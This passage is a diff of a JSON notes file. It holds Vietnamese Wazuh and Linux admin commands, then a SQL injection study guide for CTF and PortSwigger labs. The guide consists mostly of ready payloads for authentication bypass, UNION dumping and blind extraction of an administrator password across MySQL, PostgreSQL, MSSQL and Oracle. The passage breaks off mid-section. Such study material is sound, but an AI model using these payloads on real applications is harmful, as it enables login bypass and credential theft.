+      "content": "Dùng để kiểm tra cấu trúc dữ liệu thô. Xác nhận chính xác tên trường (phân biệt hoa/thường) và kiểu dữ liệu (keyword hay text) trước khi lập trình AI (Context Enrichment) hoặc truy vấn DSL.",
+      "code": "curl -sk -u admin:admin \"https://localhost:9200/wazuh-alerts-*/_mapping?pretty\" | grep -iE \"processGuid|eventID|commandLine\"",
+      "notes": "Rất quan trọng để tránh lỗi query sai trường dẫn đến kết quả rỗng (hits = 0).",
+      "tags": [
+        "api",
+        "curl",
+        "opensearch",
+        "mapping"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "9ce8290e-5545-433e-9678-14515f55d416",
+      "type": "command",
+      "title": "Bắt gói tin mạng Syslog (Packet Sniffing)",
+      "categoryId": "linux-system",
+      "language": "Linux",
+      "content": "Nghe lén trên cổng UDP 514 để kiểm tra xem Gateway hoặc Router đã thực sự bắn gói tin Syslog tới máy Wazuh Manager chưa. Rất hữu ích để debug lỗi mạng.",
+      "code": "sudo tcpdump -i any port 514 -n -A",
+      "notes": "",
+      "tags": [
+        "linux",
+        "tcpdump",
+        "syslog",
+        "troubleshooting"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "49d642a3-3290-4a41-acf9-7322f8bdcf92",
+      "type": "knowledge",
+      "title": "Cấp ảo hóa RAM cho Elasticsearch (Khắc phục lỗi Crash Java)",
+      "categoryId": "linux-system",
+      "language": "Linux",
+      "content": "Lệnh sinh tử trên máy Host chạy OpenStack, Docker hoặc cài Elasticsearch (TheHive/Indexer). Nếu không chạy lệnh này, Elasticsearch hoặc Cassandra sẽ sập ngay sau vài giây vì bị nhân Linux chặn cấp phát vùng nhớ ảo.",
+      "code": "sudo sysctl -w vm.max_map_count=262144",
+      "notes": "Để lưu vĩnh viễn, phải ghi vào file /etc/sysctl.conf.",
+      "tags": [
+        "linux",
+        "sysctl",
+        "elasticsearch",
+        "troubleshooting"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "34a09eb4-27cb-4be9-a0bd-f9aa78effb3d",
+      "type": "command",
+      "title": "Làm đẹp và lọc field log JSON trên Terminal",
+      "categoryId": "linux-file",
+      "language": "Bash",
+      "content": "Ép định dạng log JSON trên 1 dòng của file alerts.json thành dạng cây dễ nhìn, đồng thời dùng grep lọc ra đúng các trường agent, rule, timestamp phục vụ debug nhanh mà không cần lên Web.",
+      "code": "tail -3 /var/ossec/logs/alerts/alerts.json | python3 -m json.tool 2>/dev/null | grep -E \"agent|rule|timestamp\" | head -10",
+      "notes": "",
+      "tags": [
+        "linux",
+        "json",
+        "tail",
+        "grep"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "8ef198b9-e8dc-4ed6-8992-474fba4dfc6a",
+      "type": "command",
+      "title": "Tìm log thô trong kho Archives kèm ngữ cảnh (Grep -A -B)",
+      "categoryId": "linux-file",
+      "language": "Linux",
+      "content": "Nơi sự thật nằm lại. Dùng để lấy mẫu log thô viết Decoder hoặc kiểm tra Agent có gửi log về không. Tham số -A 5 (hiển thị 5 dòng sau từ khóa), -B 2 (hiển thị 2 dòng trước) giúp đọc log XML/JSON dài mà không bị đứt đoạn.",
+      "code": "grep -A 5 -B 2 \"sysmon\" /var/ossec/logs/archives/archives.log | tail -n 20",
+      "notes": "",
+      "tags": [
+        "linux",
+        "grep",
+        "log-analysis",
+        "archives"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "1a6e8855-8afd-4da4-be56-504b9768c26b",
+      "type": "command",
+      "title": "Cấp quyền thực thi script Active Response / SOAR",
+      "categoryId": "linux-file",
+      "language": "Linux",
+      "content": "Khi đưa script Python/Bash (VD chặn IP, gửi Telegram) vào Agent hoặc Manager, file mặc định là text. Bắt buộc phải cấp quyền thực thi (750) và giao quyền sở hữu cho user root:ossec thì Wazuh mới gọi script chạy tự động được.",
+      "code": "sudo chmod 750 /var/ossec/active-response/bin/<tên_file>\nsudo chown root:ossec /var/ossec/active-response/bin/<tên_file>",
+      "notes": "Nếu thiếu bước này, khi Rule nổ, Wazuh sẽ báo lỗi 'Permission Denied' và lệnh chặn mã độc sẽ thất bại.",
+      "tags": [
+        "linux",
+        "chmod",
+        "chown",
+        "active-response"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "4612f0cb-1d20-4a3a-9d57-5f391a475be9",
+      "type": "command",
+      "title": "Kiểm tra luồng đẩy log Filebeat sang Indexer",
+      "categoryId": "wazuh",
+      "language": "Linux",
+      "content": "Dùng để kiểm tra kết nối từ Manager (chạy Filebeat) đến cổng 9200 của Indexer. Giúp phát hiện lỗi sai IP, tường lửa chặn, hoặc chứng chỉ SSL không hợp lệ.",
+      "code": "filebeat test output",
+      "notes": "Lỗi SSL thường gặp: x509 certificate is valid for IP_A, not IP_B (do đổi mạng). Khắc phục: thêm `ssl.verification_mode: none` vào filebeat.yml để test lab nội bộ.",
+      "tags": [
+        "filebeat",
+        "indexer",
+        "troubleshooting"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "39312acf-611e-48a8-a4a6-21c23b3b52fe",
+      "type": "command",
+      "title": "Kiểm tra trạng thái các tiến trình (Daemons) của Wazuh",
+      "categoryId": "wazuh",
+      "language": "Linux",
+      "content": "Kiểm tra xem tiến trình ngầm nào đang bị sập (stopped/failed) trên Manager.",
+      "code": "/var/ossec/bin/wazuh-control status",
+      "notes": "Nếu wazuh-dbd chết -> Giao diện Dashboard báo Error 2005. Nếu wazuh-analysisd chết -> Hệ thống mù, không bắt được log.",
+      "tags": [
+        "wazuh",
+        "status",
+        "daemon"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "c014ffa9-74e9-4032-b645-a72e70094ca9",
+      "type": "command",
+      "title": "Trình mô phỏng phân tích log (Logtest)",
+      "categoryId": "wazuh",
+      "language": "Linux",
+      "content": "Công cụ giả lập để test Custom Rule/Decoder. Dán raw log thô vào, hệ thống sẽ in ra 3 phase: Phase 1 (Pre-decoder nhận diện loại log), Phase 2 (Decoder bóc tách các trường data), Phase 3 (Rule matching - ID luật và Level).",
+      "code": "/var/ossec/bin/wazuh-logtest",
+      "notes": "Nếu Phase 3 không báo Rule nào khớp hoặc Level < 3, log đó sẽ bị hệ thống vứt đi, không được ghi vào alerts.json và không hiển thị lên Dashboard.",
+      "tags": [
+        "wazuh",
+        "testing",
+        "decoder",
+        "rule"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "dce49391-8083-418c-826e-6b3588c6d2de",
+      "type": "knowledge",
+      "title": "Kiểm tra lỗi cú pháp cấu hình (Syntax Validation)",
+      "categoryId": "wazuh",
+      "language": "Linux",
+      "content": "Lệnh sinh tử của Core Architect. Dùng để rà soát lỗi cú pháp (XMLERR, thiếu thẻ đóng, sai regex) của toàn bộ file cấu hình, Rule và Decoder. Chỉ khi báo 'Configuration validation OK' mới được phép restart dịch vụ.",
+      "code": "/var/ossec/bin/wazuh-analysisd -t",
+      "notes": "Lỗi thường gặp: Gõ trực tiếp ký tự `<` hoặc `>` trong thẻ regex gây sập Manager. Cách sửa: Phải dùng XML Entities `&lt;` và `&gt;`.",
+      "tags": [
+        "wazuh",
+        "troubleshooting",
+        "syntax-check"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782449721467,
+      "updatedAt": 1782449721467
+    },
+    {
+      "id": "7150200c-ed5f-4279-9574-58dae8d59d60",
+      "type": "command",
+      "title": "systemctl",
+      "categoryId": "linux-system",
+      "language": "Linux",
+      "content": "Quản lý service dùng systemd: start, stop, restart, enable, disable, status.",
+      "code": "systemctl status nginx\nsystemctl restart nginx\nsystemctl enable nginx",
+      "notes": "",
+      "tags": [
+        "systemd",
+        "service"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782399806005,
+      "updatedAt": 1782399806005
+    },
+    {
+      "id": "5fe129ca-c049-4db0-9d35-dea0dc1f9303",
+      "type": "file",
+      "title": "nginx.conf",
+      "categoryId": "linux-system",
+      "language": "Linux",
+      "content": "File cấu hình chính của Nginx, định nghĩa worker, include, khối http và server.",
+      "code": "worker_processes auto;\nevents { worker_connections 1024; }\nhttp {\n  include /etc/nginx/conf.d/*.conf;\n}",
+      "notes": "Nằm ở /etc/nginx/nginx.conf",
+      "tags": [
+        "config",
+        "nginx"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782399806005,
+      "updatedAt": 1782399806005
+    },
+    {
+      "id": "0161e57a-4d30-46d0-9fc9-423c2832f58f",
+      "type": "knowledge",
+      "title": "/var/log/nginx",
+      "categoryId": "linux-system",
+      "language": "Linux",
+      "content": "Thư mục log của Nginx, chứa access.log và error.log.",
+      "code": "",
+      "notes": "Dùng để debug và theo dõi request.",
+      "tags": [
+        "log",
+        "nginx"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782399806005,
+      "updatedAt": 1782399806005
+    },
+    {
+      "id": "b013177c-ebb7-4823-8157-f65f864d74d3",
+      "type": "knowledge",
+      "title": "Cách hoạt động của reverse proxy",
+      "categoryId": "linux-system",
+      "language": "Linux",
+      "content": "Reverse proxy nhận request từ client rồi chuyển tiếp đến backend server. Nginx thường được dùng làm reverse proxy đứng trước Node.js, Python, hoặc các app backend khác.",
+      "code": "server {\n  listen 80;\n  server_name example.com;\n  location / {\n    proxy_pass http://127.0.0.1:3000;\n    proxy_set_header Host $host;\n  }\n}",
+      "notes": "Lợi ích: load balancing, SSL termination, caching, security.",
+      "tags": [
+        "reverse-proxy",
+        "nginx",
+        "architecture"
+      ],
+      "pinned": false,
+      "isKnowledge": true,
+      "createdAt": 1782399806005,
+      "updatedAt": 1782407851609
+    },
+    {
+      "id": "fde8d6de-59d0-47b9-9eb2-74989df47c8e",
+      "type": "file",
+      "title": "package.json",
+      "categoryId": "linux-system",
+      "language": "JavaScript",
+      "content": "Khai báo metadata dự án, dependencies và scripts.",
+      "code": "{\n  \"name\": \"my-app\",\n  \"scripts\": {\n    \"dev\": \"node index.js\",\n    \"start\": \"node index.js\"\n  }\n}",
+      "notes": "Dùng npm install để cài dependencies.",
+      "tags": [
+        "config",
+        "npm"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1782399806005,
+      "updatedAt": 1782448021383
+    }
+  ],
+  "documents": [
+    {
+      "id": "doc-sqli",
+      "title": "SQL Injection (SQLi) — Knowledge Base",
+      "description": "In-Band · Blind · Out-of-Band | MySQL · PostgreSQL · MSSQL · Oracle — Học tập, CTF, Pentest Lab (PortSwigger Web Academy)",
+      "tags": [
+        "security",
+        "sql",
+        "sqli",
+        "pentest",
+        "ctf",
+        "portswigger"
+      ],
+      "content": "# SQL Injection (SQLi) — Knowledge Base\n\n> **Phạm vi:** In-Band · Blind · Out-of-Band | MySQL · PostgreSQL · MSSQL · Oracle\n> **Mục đích:** Học tập, CTF, Pentest Lab (PortSwigger Web Academy)\n\n---\n\n## Phần I — In-Band SQLi (Khai thác trực tiếp)\n\n> **Định nghĩa:** Kênh gửi payload và kênh nhận kết quả là **cùng một đường truyền** — dữ liệu khai thác được trả trực tiếp qua phản hồi HTTP.\n\n---\n\n### 1. SQLi trong mệnh đề WHERE\n\nKịch bản: Câu truy vấn `SELECT` lọc dữ liệu theo điều kiện `WHERE` (danh mục sản phẩm, từ khóa tìm kiếm, chi tiết bài viết…).\n\nMục tiêu: Biến mệnh đề `WHERE` thành `TRUE` để ép DBMS trả về toàn bộ bản ghi trong bảng.\n\n#### Payload\n\n| DBMS | Payload | Ghi chú |\n|---|---|---|\n| MySQL | `'+OR+1=1#` hoặc `'+OR+1=1+--+` | `#` là comment MySQL; `--+` = `-- ` (dấu cách bắt buộc) |\n| PostgreSQL | `'+OR+1=1--` | |\n| MSSQL | `'+OR+1=1--` | |\n| Oracle | `'+OR+1=1--` | |\n\n#### Cơ chế hoạt động\n\n```sql\n-- Câu truy vấn gốc\nSELECT * FROM products WHERE category = '$input'\n\n-- Sau khi tiêm ' OR 1=1--\nSELECT * FROM products WHERE category = '' OR 1=1--'\n```\n\n| Thành phần | Vai trò |\n|---|---|\n| `'` | Đóng sớm string literal của lập trình viên |\n| `OR 1=1` | Biến điều kiện WHERE thành luôn True với mọi bản ghi |\n| `--` / `#` | Comment hóa phần còn lại của câu lệnh gốc |\n\n---\n\n### 2. Subverting Application Logic (Vô hiệu hóa xác thực)\n\nKịch bản: Form đăng nhập, kiểm tra OTP, xác thực token.\n\nMục tiêu: Đăng nhập thành công mà không cần biết mật khẩu.\n\n#### Payload\n\n| DBMS | Payload (tiêm vào trường username) |\n|---|---|\n| MySQL | `' OR 1=1#` |\n| PostgreSQL | `' OR 1=1--` |\n| MSSQL | `' OR 1=1--` |\n| Oracle | `' OR 1=1--` |\n\n#### Cơ chế hoạt động\n\n```sql\n-- Câu truy vấn gốc\nSELECT * FROM users WHERE username = '$user' AND password = '$pass'\n\n-- Sau khi tiêm ' OR 1=1-- vào $user\nSELECT * FROM users WHERE username = '' OR 1=1--' AND password = '...'\n```\n\nParser gặp `--` → bỏ qua hoàn toàn mệnh đề `AND password = ...`\n\nBiểu thức `'' OR 1=1` → `TRUE` → DBMS trả về bản ghi đầu tiên trong bảng `users` (thường là `admin` với `user_id = 1`)\n\n---\n\n### 3. UNION Attack (Tấn công hợp nhất truy vấn)\n\nKhái niệm: Ghép kết quả của một `SELECT` do attacker tự tạo vào kết quả truy vấn gốc bằng toán tử `UNION`.\n\n#### Hai điều kiện bắt buộc\n\n| Điều kiện | Mô tả |\n|---|---|\n| Khớp số cột | Hai `SELECT` phải trả về số cột bằng nhau |\n| Khớp kiểu dữ liệu | Các cột tương ứng phải cùng kiểu (hoặc có thể ép kiểu ngầm) |\n\n---\n\n#### 3.1 Xác định số lượng cột của truy vấn gốc\n\n**Cách A — `ORDER BY n` (Khuyên dùng)**\n\nTăng dần `n` cho đến khi DBMS trả lỗi \"index out of range\" → số cột = `n - 1`.\n\n```\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--   ← Nếu đây là lần đầu báo lỗi → có 2 cột\n```\n\n| DBMS | Comment terminator |\n|---|---|\n| MySQL | `#` hoặc `-- ` (có dấu cách) |\n| PostgreSQL | `--` |\n| MSSQL | `--` |\n| Oracle | `--` |\n\n**Cách B — `UNION SELECT NULL`**\n\n`NULL` là kiểu đa hình (Polymorphic), tương thích mọi kiểu dữ liệu. Tăng số `NULL` cho đến khi không còn lỗi HTTP 500.\n\n| DBMS | Payload | Ghi chú |\n|---|---|---|\n| MySQL | `' UNION SELECT NULL,NULL,NULL#` | |\n| PostgreSQL | `' UNION SELECT NULL,NULL,NULL--` | |\n| MSSQL | `' UNION SELECT NULL,NULL,NULL--` | |\n| Oracle | `' UNION SELECT NULL,NULL,NULL FROM DUAL--` | Oracle bắt buộc phải có `FROM`; dùng bảng ảo `DUAL` |\n\n---\n\n#### 3.2 Xác định vị trí cột có thể hiển thị chuỗi\n\nSau khi biết số cột (ví dụ: 3 cột), lần lượt thay `NULL` bằng `'a'` để tìm vị trí hiển thị văn bản ra giao diện.\n\n```sql\n-- Thử cột 1\n' UNION SELECT 'a',NULL,NULL--\n\n-- Thử cột 2\n' UNION SELECT NULL,'a',NULL--\n\n-- Thử cột 3\n' UNION SELECT NULL,NULL,'a'--\n```\n\n> **Oracle:** Thêm `FROM DUAL` vào cuối mỗi payload.\n> **MySQL:** Dùng `#` thay vì `--`.\n\n---\n\n#### 3.3 Trích xuất lược đồ cơ sở dữ liệu\n\n**Nhóm ANSI SQL — MySQL / PostgreSQL / MSSQL**\n\nListet kê bảng:\n\n```sql\n-- MySQL\n' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()#\n\n-- PostgreSQL\n' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--\n\n-- MSSQL\n' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--\n```\n\nLiệt kê cột của bảng `users`:\n\n```sql\n-- MySQL\n' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'#\n\n-- PostgreSQL / MSSQL\n' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--\n```\n\nDanh mục `information_schema` quan trọng:\n\n| Bảng hệ thống | Nội dung |\n|---|---|\n| `tables` | Toàn bộ bảng trong hệ thống |\n| `columns` | Chi tiết cột của từng bảng |\n| `schemata` | Danh sách database trên server |\n| `views` | Danh sách view logic |\n| `statistics` | Thông tin index |\n| `key_column_usage` | Primary Key, Foreign Key |\n| `table_constraints` | Ràng buộc Check, Unique… |\n| `triggers` | Danh sách trigger |\n| `routines` | Stored Procedure & Function |\n| `events` | Tác vụ Event Scheduler |\n\nCác trường quan trọng trong `information_schema.tables`:\n\n| Cột | Ý nghĩa |\n|---|---|\n| `TABLE_CATALOG` | Tên catalog (thường là `def`) |\n| `TABLE_SCHEMA` | Database chứa bảng |\n| `TABLE_NAME` | Tên bảng |\n| `TABLE_TYPE` | `BASE TABLE` hoặc `VIEW` |\n| `ENGINE` | Storage engine (InnoDB, MyISAM…) |\n| `ROW_FORMAT` | Định dạng lưu trữ vật lý (Dynamic, Compact…) |\n| `TABLE_ROWS` | Số dòng ước tính |\n| `DATA_LENGTH` | Tổng dung lượng dữ liệu (bytes) |\n| `INDEX_LENGTH` | Tổng dung lượng file index (bytes) |\n| `AUTO_INCREMENT` | Giá trị tự tăng tiếp theo |\n| `CREATE_TIME` | Thời điểm tạo bảng |\n| `UPDATE_TIME` | Lần ghi dữ liệu gần nhất |\n| `TABLE_COLLATION` | Bộ mã hóa ký tự (vd: `utf8mb4_general_ci`) |\n| `TABLE_COMMENT` | Ghi chú của developer |\n\n---\n\n**Oracle DBMS**\n\n> **Lưu ý:** Oracle lưu tên bảng và cột bằng **CHỮ IN HOA** theo mặc định.\n\n```sql\n-- Liệt kê bảng\n' UNION SELECT NULL,table_name,NULL FROM all_tables--\n\n-- Liệt kê cột của bảng USERS\n' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--\n```\n\nCác trường quan trọng trong `ALL_TABLES` (Oracle):\n\n| Cột | Ý nghĩa |\n|---|---|\n| `OWNER` | Schema chủ sở hữu bảng |\n| `TABLE_NAME` | Tên bảng |\n| `TABLESPACE_NAME` | Tablespace vật lý chứa bảng |\n| `NUM_ROWS` | Số bản ghi ước tính |\n| `BLOCKS` | Số data block đã cấp phát |\n| `LAST_ANALYZED` | Lần chạy thống kê gần nhất |\n| `PARTITIONED` | Có phân vùng không (`YES`/`NO`) |\n| `TEMPORARY` | Bảng tạm thời (`Y`/`N`) |\n| `CLUSTER_NAME` | Thuộc cluster nào (nếu có) |\n\nCác trường quan trọng trong `ALL_TAB_COLUMNS` (Oracle):\n\n| Cột | Ý nghĩa |\n|---|---|\n| `OWNER` | Schema chứa bảng |\n| `TABLE_NAME` | Tên bảng |\n| `COLUMN_NAME` | Tên cột |\n| `DATA_TYPE` | Kiểu dữ liệu (`VARCHAR2`, `NUMBER`, `DATE`…) |\n| `DATA_LENGTH` | Độ dài tối đa |\n| `NULLABLE` | Cho phép NULL (`Y`/`N`) |\n| `COLUMN_ID` | Thứ tự vị trí vật lý trong bảng |\n| `DATA_PRECISION` | Độ chính xác (cho kiểu `NUMBER`) |\n| `DATA_SCALE` | Số chữ số sau dấu thập phân |\n\n---\n\n#### 3.4 Gom nhiều giá trị vào một cột hiển thị\n\nKhi giao diện chỉ hiển thị được dữ liệu từ một cột duy nhất, dùng toán tử nối chuỗi để gộp nhiều trường vào cùng một output:\n\n| DBMS | Payload |\n|---|---|\n| MySQL | `' UNION SELECT NULL,CONCAT(username,'~',password),NULL FROM users#` |\n| PostgreSQL | `' UNION SELECT NULL,username\\|\\|'~'\\|\\|password,NULL FROM users--` |\n| MSSQL | `' UNION SELECT NULL,username+'~'+password,NULL FROM users--` |\n| Oracle | `' UNION SELECT NULL,username\\|\\|'~'\\|\\|password,NULL FROM users--` |\n\n---\n\n## Phần II — Blind SQLi (Khai thác mù)\n\n> **Áp dụng khi:** Ứng dụng có lỗ hổng nhưng **không hiển thị dữ liệu** kết quả, không trả thông báo lỗi cú pháp ra màn hình.\n\n---\n\n### 1. Boolean-Based Blind (Phản hồi Đúng/Sai)\n\nQuan sát sự thay đổi giao diện (nội dung HTML, độ dài response, mã HTTP) để suy ngược logic.\n\n#### 1.1 Kiểm tra kênh Blind SQL có tồn tại không\n\nTiêm hai payload đối lập, quan sát phản hồi có khác nhau không:\n\n| DBMS | Điều kiện TRUE | Điều kiện FALSE |\n|---|---|---|\n| MySQL | `TrackingId=xyz' AND '1'='1#` | `TrackingId=xyz' AND '1'='2#` |\n| PostgreSQL / MSSQL / Oracle | `TrackingId=xyz' AND '1'='1--` | `TrackingId=xyz' AND '1'='2--` |\n\n---\n\n#### 1.2 Xác minh sự tồn tại của bảng và cột\n\nKiểm tra bảng `users` có tồn tại không:\n\n```sql\n-- MySQL / PostgreSQL\nTrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--\n\n-- MSSQL (không có LIMIT, dùng TOP)\nTrackingId=xyz' AND (SELECT TOP 1 'a' FROM users)='a'--\n\n-- Oracle (không có LIMIT, dùng ROWNUM)\nTrackingId=xyz' AND (SELECT 'a' FROM users WHERE ROWNUM=1)='a'--\n```\n\nKiểm tra username `administrator` có tồn tại không:\n\n```sql\n-- MySQL / PostgreSQL\nTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' LIMIT 1)='a'--\n\n-- MSSQL\nTrackingId=xyz' AND (SELECT TOP 1 'a' FROM users WHERE username='administrator')='a'--\n\n-- Oracle\nTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND ROWNUM=1)='a'--\n```\n\n---\n\n#### 1.3 Xác định độ dài mật khẩu\n\nDùng toán tử so sánh `>` với tìm kiếm nhị phân để thu hẹp nhanh:\n\n```sql\n-- MySQL\nTrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator' LIMIT 1) > 1#\n\n-- PostgreSQL\nTrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator' LIMIT 1) > 1--\n\n-- MSSQL (dùng LEN() thay LENGTH())\nTrackingId=xyz' AND (SELECT TOP 1 LEN(password) FROM users WHERE username='administrator') > 1--\n\n-- Oracle\nTrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator' AND ROWNUM=1) > 1--\n```\n\n> **Kỹ thuật tối ưu:** Dùng **Binary Search** trên khoảng `[1, 50]` → giảm số request từ O(n) xuống O(log n).\n\n---\n\n#### 1.4 Dò từng ký tự mật khẩu\n\nCắt ký tự tại vị trí `pos` rồi so sánh mã ASCII:\n\n```sql\n-- MySQL\nTrackingId=xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator' LIMIT 1),1,1)) > 77#\n\n-- PostgreSQL\nTrackingId=xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator' LIMIT 1),1,1)) > 77--\n\n-- MSSQL\nTrackingId=xyz' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='administrator'),1,1)) > 77--\n\n-- Oracle (dùng SUBSTR thay SUBSTRING)\nTrackingId=xyz' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator' AND ROWNUM=1),1,1)) > 77--\n```\n\n> **Chiến lược Binary Search ASCII:**\n> Bảng in thường nằm trong `[32, 126]`. Bắt đầu so `> 79` → thu hẹp một nửa mỗi bước → cần ~7 request/ký tự.\n\n---\n\n### 2. Error-Based Blind (Cưỡng bức gây lỗi)\n\n> **Nguyên lý:** Ép DBMS ném lỗi HTTP 500 khi điều kiện kiểm tra là `TRUE`, trả HTTP 200 khi `FALSE`. Phân biệt đúng/sai dựa vào mã HTTP.\n\n#### 2.1 Kiểm tra hệ thống có phản ứng với lỗi cú pháp không\n\n```\nTrackingId=xyz'    →  HTTP 500 (lỗi nháy đơn lẻ)\nTrackingId=xyz''   →  HTTP 200 (nháy đơn được escape)\n```\n\n---\n\n#### 2.2 Kiểm tra khả năng thực thi sub-query\n\n```sql\n-- MySQL / PostgreSQL\nTrackingId=xyz' || (SELECT '') || '--\n\n-- MSSQL: KHÔNG dùng ||, phải dùng +\nTrackingId=xyz' + (SELECT '') + '--\n\n-- Oracle\nTrackingId=xyz' || (SELECT '' FROM dual) || '--\n```\n\n> **Lỗi thường gặp:** MSSQL không hỗ trợ toán tử `||` — phải dùng `+` để nối chuỗi.\n\n---\n\n#### 2.3 Xác minh bảng tồn tại qua lỗi (Oracle)\n\n```sql\n-- Nếu bảng users không tồn tại → Oracle ném ORA-00942\nTrackingId=xyz' || (SELECT '' FROM users WHERE ROWNUM=1) || '--\n```\n\n---\n\n#### 2.4 Kích hoạt lỗi theo điều kiện\n\nCơ chế: Điều kiện `TRUE` → thực hiện `1/0` → DBMS ném HTTP 500. Điều kiện `FALSE` → trả chuỗi rỗng → HTTP 200.\n\n**Kịch bản A — Điều kiện luôn đúng (kiểm tra cơ chế):**\n\n```sql\n-- MySQL (gây lỗi \"Subquery returns more than 1 row\")\nTrackingId=xyz' OR IF((1=1),(SELECT table_name FROM information_schema.tables),1)#\n\n-- PostgreSQL / MSSQL\nTrackingId=xyz' OR 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--\n\n-- Oracle\nTrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '--\n```\n\n**Kịch bản B — Kiểm tra độ dài mật khẩu:**\n\n```sql\n-- MySQL\nTrackingId=xyz' || IF((SELECT LENGTH(password) FROM users WHERE username='administrator' LIMIT 1)>1,(SELECT table_name FROM information_schema.tables),'a')#\n\n-- PostgreSQL\nTrackingId=xyz' || (SELECT CASE WHEN LENGTH(password)>1 THEN CAST(1/0 AS text) ELSE '' END FROM users WHERE username='administrator' LIMIT 1)--\n\n-- MSSQL\nTrackingId=xyz'; IF (SELECT TOP 1 LEN(password) FROM users WHERE username='administrator')>1 WAITFOR DELAY '0:0:5'--\n\n-- Oracle\nTrackingId=xyz' || (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ROWNUM=1) || '--\n```\n\n**Kịch bản C — Dò từng ký tự mật khẩu:**\n\n```sql\n-- Oracle\nTrackingId=xyz' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ROWNUM=1) || '--\n\n-- PostgreSQL\nTrackingId=xyz' || (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN CAST(1/0 AS text) ELSE '' END FROM users WHERE username='administrator' LIMIT 1)--\n\n-- MSSQL\nTrackingId=xyz'; IF (SELECT TOP 1 SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:5'--\n\n-- MySQL\nTrackingId=xyz' || IF(SUBSTRING((SELECT password FROM users WHERE username='administrator' LIMIT 1),1,1)='a',(SELECT table_name FROM information_schema.tables),'a')#\n```\n\n---\n\n### 3. Verbose Error Extraction (Trích xuất qua thông báo lỗi)\n\n> **Nguyên lý:** Ép DBMS thực hiện phép **ép kiểu phi logic** (chuỗi → integer) → thông báo lỗi nhúng kèm giá trị dữ liệu thực tế.\n\n| DBMS | Payload | Lỗi trả về |\n|---|---|---|\n| MSSQL | `TrackingId=' AND 1=CAST((SELECT TOP 1 username FROM users) AS int)--` | `Conversion failed when converting the nvarchar value 'administrator' to data type int` |\n| PostgreSQL | `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` | `invalid input syntax for integer: \"administrator\"` |\n| MySQL | `TrackingId=' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT username FROM users LIMIT 1)))#` | `XPATH syntax error: '\\\\administrator'` |\n| Oracle | `TrackingId=' AND 1=TO_NUMBER((SELECT username FROM users WHERE ROWNUM=1))--` | `invalid number` (kèm giá trị thực) |\n\n> **Mở rộng:** Sau khi leak `username`, đổi `username` thành `password` trong sub-query để lấy mật khẩu.\n\n---\n\n### 4. Time-Based Blind (Khai thác qua độ trễ)\n\n> **Áp dụng khi:** Hệ thống **nuốt toàn bộ lỗi**, không có sự khác biệt giao diện. Phân biệt đúng/sai bằng thời gian phản hồi.\n\n#### 4.1 Gây trễ vô điều kiện (kiểm tra cơ chế)\n\n| DBMS | Payload |\n|---|---|\n| MySQL | `TrackingId=xyz' OR SLEEP(10)#` |\n| PostgreSQL | `TrackingId=xyz' OR pg_sleep(10)--` |\n| MSSQL | `TrackingId=xyz'; WAITFOR DELAY '0:0:10'--` ← `WAITFOR` là Statement, bắt buộc dùng `;` |\n| Oracle | `TrackingId=xyz' || (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) || '--` |\n\n#### 4.2 Gây trễ theo điều kiện (dò mật khẩu)\n\nĐiều kiện `TRUE` → server treo N giây. Điều kiện `FALSE` → phản hồi 